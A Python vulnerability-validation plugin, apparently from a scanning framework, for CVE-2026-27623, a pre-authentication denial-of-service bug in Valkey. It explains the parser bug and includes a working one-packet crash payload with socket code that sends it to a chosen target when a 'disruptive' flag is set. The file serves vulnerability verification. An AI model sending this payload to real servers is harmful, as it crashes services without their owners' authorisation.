#!/usr/bin/env python3
"""CVE-2026-27623 – Valkey Pre-Authentication DoS via malformed RESP pipeline.

Public PoC source: https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-27623%20Pre-Authentication%20DOS%20from%20malformed%20RESP%20request
  Files: ['exploit/exp.py']
  Payload: b"*0\\r\\nPING\\r\\n"  (single TCP send, no auth needed)
  Technique:
    1. Send *0\\r\\n  → RESP2 multibulk with 0 args; parseMultibulk sets reqtype=MULTIBULK, returns
       READ_FLAGS_PARSING_NEGATIVE_MBULK_LEN.
    2. handleParseResults calls resetClient() but does NOT clear c->reqtype (bug in ≤ 9.0.2).
    3. processInputBuffer loops again, sees PING\\r\\n remaining, skips type-detection
       (reqtype still MULTIBULK), expects '*' as first byte – gets 'P' → serverAssertWithInfo crash.
    4. valkey-server process aborts (SIGABRT) – complete DoS, no auth required.
  Fixed: valkey 9.0.3 (commit 2c311dd7173 – adds c->reqtype = 0 in resetClient paths).
  CVSS 3.1: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H).

Reference: https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr
"""
from __future__ import annotations

import socket

from active_validation_core import run_active_validation
from iv_plugin_base import IVIVulnerabilityPlugin

VULN = {
    "id": 63,
    "cve": "CVE-2026-27623",
    "year": 2026,
    "domain": "network",
    "vendor_product": "Valkey",
    "component": "valkey-server networking.c: processInputBuffer / parseMultibulk / handleParseResults – reqtype not cleared",
    "type": "远程拒绝服务 – 预认证断言崩溃",
    "summary": (
        "CVE-2026-27623: Valkey ≤ 9.0.2 在处理畸形 RESP 请求时，processInputBuffer "
        "第一次解析 *0\\r\\n（零元素 multibulk）后未清除 c->reqtype，"
        "第二次循环解析 PING\\r\\n 时在 parseMultibulk 内断言 c->querybuf[qb_pos]=='*' 失败，"
        "进程 SIGABRT。攻击者发送 *0\\r\\nPING\\r\\n 即可无需认证导致 DoS。"
    ),
    "source_url": "https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr",
    "requires_manual_review": False,
    "affected": [
        {"vendor": "Valkey", "product": "valkey",
         "versions": [{"version": "9.0.0", "status": "affected", "lessThan": "9.0.3"}]},
    ],
}

# The exact PoC payload from poc-lab exploit/exp.py
# Two logical RESP requests in a single TCP send:
#   *0\r\n  → array header with 0 elements (causes reqtype to stay MULTIBULK after resetClient bug)
#   PING\r\n → inline command (starts with 'P', not '*' → assertion failure)
TRIGGER_PAYLOAD = b"*0\r\nPING\r\n"


def _probe_valkey(target_ip: str, port: int, timeout: float = 6.0) -> dict:
    """Send the DoS payload and check for connection reset (crash) vs normal PONG response."""
    result: dict = {}
    try:
        # First check: is there a Valkey/Redis server here?
        with socket.create_connection((target_ip, port), timeout=timeout) as s:
            s.settimeout(timeout)
            s.sendall(TRIGGER_PAYLOAD)
            try:
                data = s.recv(4096)
                result["recv_data"] = data[:200]
                result["recv_hex"] = data[:20].hex()
                if b"+PONG" in data:
                    result["response"] = "PONG received – server processed inline PING after *0 (likely PATCHED)"
                    result["patched"] = True
                elif data == b"":
                    result["response"] = "Empty response (connection closed) – server may have crashed (VULNERABLE)"
                    result["crashed"] = True
                else:
                    result["response"] = f"Unexpected response: {data[:50]!r}"
            except ConnectionResetError:
                result["response"] = "Connection reset by peer – server aborted (VULNERABLE)"
                result["crashed"] = True
            except socket.timeout:
                result["response"] = "Recv timeout – server may be hanging (ambiguous)"
    except ConnectionRefusedError:
        result["no_service"] = f"No service at {target_ip}:{port}"
    except Exception as exc:
        result["error"] = str(exc)
    return result


def _run_poc(plugin) -> dict:
    params = plugin.params or {}
    target_ip = params.get("target_ip", getattr(plugin, "target_ip", "127.0.0.1"))
    port = int(params.get("port", 6379))
    allow_disruptive = getattr(plugin, "_allow_disruptive", False) or \
        bool(params.get("allow_disruptive"))

    evidence: dict = {
        "cve": "CVE-2026-27623",
        "target": f"{target_ip}:{port}",
        "payload": "*0\\r\\nPING\\r\\n",
        "payload_hex": TRIGGER_PAYLOAD.hex(),
        "technique": (
            "Pipeline *0\\r\\n + PING\\r\\n in one TCP send. "
            "Valkey ≤9.0.2: resetClient() preserves reqtype=MULTIBULK, "
            "second parse iteration asserts buf[qb_pos]=='*' but sees 'P' → SIGABRT."
        ),
        "reference": "https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr",
        "poc_source": "https://github.com/Unclecheng-li/poc-lab/tree/main/CVE-2026-27623%20Pre-Authentication%20DOS%20from%20malformed%20RESP%20request",
        "exploit_files": ["exploit/exp.py"],
    }

    if not allow_disruptive:
        # Safe probe: just check connectivity and banner
        try:
            with socket.create_connection((target_ip, port), timeout=5) as s:
                s.settimeout(3)
                s.sendall(b"PING\r\n")
                banner = s.recv(256)
                evidence["banner"] = banner[:100].decode(errors="replace")
                evidence["service_present"] = True
        except ConnectionRefusedError:
            evidence["service_present"] = False
            return {"vulnerable": None, "evidence": evidence}
        except Exception as exc:
            evidence["error"] = str(exc)
            return {"vulnerable": None, "evidence": evidence}

        evidence["detail"] = (
            "Service present. Disruptive probe (DoS payload) requires allow_disruptive=true. "
            "The crash check sends *0\\r\\nPING\\r\\n to trigger assertion failure."
        )
        return {"vulnerable": None, "evidence": evidence, "requires_manual_review": True}

    # Disruptive mode: send the actual crash payload
    probe = _probe_valkey(target_ip, port)
    evidence.update(probe)

    if probe.get("crashed"):
        evidence["detail"] = "Server crashed after payload – CVE-2026-27623 present (valkey ≤9.0.2)."
        vulnerable = True
    elif probe.get("patched"):
        evidence["detail"] = "Server returned PONG after *0\\r\\nPING\\r\\n – likely patched (valkey ≥9.0.3)."
        vulnerable = False
    elif probe.get("no_service"):
        evidence["detail"] = "No Valkey service found."
        vulnerable = None
    else:
        evidence["detail"] = "Ambiguous response; manual verification needed."
        vulnerable = None

    return {
        "vulnerable": vulnerable,
        "evidence": evidence,
        "requires_manual_review": vulnerable is None,
    }


try:
    import sys as _sys; _sys.path.insert(0, __import__('pathlib').Path(__file__).parent.parent.as_posix())
    from probe_utils import detection_confidence as _dc
    _PROBE_UTILS = True
except ImportError:
    def _dc(level, evidence, **kw): return {'detection_confidence': {'level': level, 'evidence': evidence}}
    _PROBE_UTILS = False

class ValkeyRESPPreAuthDoSAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "poc_lab_vehicle"
    meta_display_id = "POC-NET-063"
    meta_poc_name = 'CVE-2026-27623 Valkey Pre Authentication RESP Pipeline DoS Active Validation'
    meta_cve_id = "CVE-2026-27623"
    meta_severity = "High"
    meta_protocol = "redis"
    meta_target_os = ["linux", "bsd"]
    meta_required_params = []
    meta_optional_params = ["port", "allow_disruptive"]
    meta_profiles = ["network", "valkey", "dos"]
    meta_source_url = "https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr"
    meta_references       = ['https://github.com/valkey-io/valkey/security/advisories/GHSA-93p9-5vc7-8wgr']
    meta_attack_surface = "Valkey ≤9.0.2 RESP 解析 – 无需认证 – 单 TCP 包 DoS"
    is_disruptive = True
    meta_destructive_level = "ProcessCrash"

    def check_prerequisites(self) -> bool:
        """基础前提条件检查。"""
        if not self.target_ip or self.target_ip == "N/A":
            self.logger.error("未指定目标 IP。")
            return False
        return True

    def exploit(self):
        return run_active_validation(self, VULN, probe=_run_poc)

if __name__ == "__main__":
    import argparse, json

    _desc = VULN.get("summary", "63_Valkey_RESP_PreAuth_DoS_Audit") if "VULN" in dir() else "63_Valkey_RESP_PreAuth_DoS_Audit"
    parser = argparse.ArgumentParser(description=_desc)
    parser.add_argument("target_ip", nargs="?", default="127.0.0.1",
                        help="目标 IP 地址")
    parser.add_argument("--port",       default=80, type=int)
    parser.add_argument("--disruptive", action="store_true",
                        help="启用破坏性探针（需操作员授权）")
    args = parser.parse_args()

    _plugin = ValkeyRESPPreAuthDoSAuditPlugin({
        "target_ip":        args.target_ip,
        "port":             args.port,
        "allow_disruptive": args.disruptive,
    })
    _result = _plugin.run_verify()
    print(json.dumps(_result, indent=2, ensure_ascii=False, default=str))
